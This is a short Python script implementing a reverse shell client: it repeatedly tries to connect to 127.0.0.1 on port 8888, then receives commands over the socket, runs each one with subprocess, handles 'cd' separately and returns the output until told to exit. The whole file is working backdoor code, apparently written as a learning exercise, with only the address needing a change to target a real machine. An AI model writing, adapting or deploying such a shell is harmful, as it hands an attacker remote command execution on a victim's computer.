#!/usr/bin/python3

import socket
import subprocess
import os  # Add this to manage directories

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("Connecting....")
while True:
    try:
        s.connect(("127.0.0.1", 8888))
        break
    except ConnectionRefusedError:
        pass
print("Connected")

# Initialize the current directory
current_directory = os.getcwd()

while True:
    cmd = (s.recv(1024)).decode()
    if cmd == "exit":
        break
    
    # Handle 'cd' command separately
    if cmd.startswith('cd '):
        try:
            # Update current directory
            os.chdir(cmd[3:].strip())
            # Update to new directory
            current_directory = os.getcwd()
            output = f"Changed directory to {current_directory}"
        except FileNotFoundError:
            output = "Directory not found"
        except Exception as e:
            output = str(e)
    else:
        # Run other commands
        output = subprocess.getoutput(cmd)
    
    s.send(output.encode())

s.close()
